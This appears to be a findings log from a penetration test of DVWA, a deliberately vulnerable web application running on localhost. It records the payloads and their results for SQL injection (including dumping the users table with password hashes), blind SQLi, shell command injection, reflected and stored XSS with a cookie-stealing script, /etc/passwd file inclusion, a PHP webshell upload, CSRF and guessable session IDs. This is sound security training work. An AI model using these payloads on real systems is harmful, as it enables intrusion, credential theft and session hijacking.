hypotheses.statement: DVWA at http://127.0.0.1/ is reachable and serves the login form on first GET of /login.php
evidence_refs: HTTP 302 -> login.php; login form contains username/password fields and a hidden user_token CSRF field

hypotheses.statement: admin/password (DVWA default credentials) authenticates against /login.php and yields a usable session cookie
evidence_refs: POST /login.php with user_token returns 302 to index.php; index.php then returns 200 with Welcome page

hypotheses.statement: DVWA's security level can be set to 'low' via /security.php to expose the vulnerable-module surface
evidence_refs: security=low already in cookie jar after first login; POST security=low seclev_submit=Submit accepted; cookie confirms level

hypotheses.statement: /vulnerabilities/sqli/?id=...&Submit=Submit at security=low reflects the id field verbatim into the query and dumps multiple rows; UNION SELECT user,password FROM users extracts full credential table
evidence_refs: Single-quote + OR '1'='1 returns 5 users (admin, gordonb, 1337, pablo, smithy); UNION SELECT user,password FROM users returns all 5 with MD5 password hashes (admin=5f4dcc3b5aa765d61d8327deb882cf99)

hypotheses.statement: /vulnerabilities/sqli_blind/ at security=low supports both boolean-based and time-based (SLEEP) blind SQLi on the User-ID field
evidence_refs: Boolean: id=1+' AND '1'='1 -> 'User ID exists in the database.'; id=1+' AND '1'='2 -> missing message. Time: id=1' AND SLEEP(3)-- - -> ~3145ms; baseline ~126ms

hypotheses.statement: /vulnerabilities/exec/?ip=... (POST form) at security=low concatenates user input directly into a shell ping command, allowing ';' chaining for arbitrary command execution
evidence_refs: POST ip=127.0.0.1; id returns ping output followed by 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'

hypotheses.statement: /vulnerabilities/xss_r/?name=... at security=low reflects input unencoded into the page body, allowing reflected XSS
evidence_refs: GET name=<script>alert(1)</script> is rendered inside the response body as raw HTML ('Hello <script>alert(1)</script>')

hypotheses.statement: /vulnerabilities/xss_s/ at security=low persists unencoded messages in the DB and renders them on every load (stored XSS with cookie-theft potential)
evidence_refs: POST mtxMessage=<script>document.location=...?cookie=+document.cookie</script> stored; subsequent GET of /vulnerabilities/xss_s/ renders the script tag inside guestbook_comments div

hypotheses.statement: /vulnerabilities/fi/?page=... at security=low includes arbitrary local files via ../ traversal; remote URL inclusion is blocked because PHP allow_url_include is disabled
evidence_refs: LFI: page=../../../../../etc/passwd at depth 5 returns 'root:x:0:0:root:/root:/bin/bash' inside the response. RFI: blocked — /setup.php shows 'allow_url_include: Disabled'

hypotheses.statement: /vulnerabilities/upload/ at security=low accepts arbitrary file types (no extension/MIME validation) and stores under /hackable/uploads/, enabling PHP webshell upload + execution
evidence_refs: Uploaded shell.php containing <?php system($_GET['c']);?> returns 'succesfully uploaded!' message; GET /hackable/uploads/shell.php?c=id;uname%20-a;pwd executes and prints uid=33(www-data) and Linux kernel banner

hypotheses.statement: /vulnerabilities/csrf/ at security=low changes the admin password via a single GET request (no token, no confirmation challenge), enabling one-click CSRF
evidence_refs:
GET /vulnerabilities/csrf/?password_new=csrfpwn&password_conf=csrfpwn&Change=Change returns '
Password Changed.
'. Password reverted to 'password' after the test

hypotheses.statement: /vulnerabilities/weak_id/ at security=low sets a session cookie (dvwaSession) using a predictable monotonically-incrementing integer, allowing trivial session hijack by enumeration
evidence_refs: Five POSTs to /vulnerabilities/weak_id/ set dvwaSession cookies with values 1, 2, 3, 4, 5 in sequence (linear counter, no randomness)
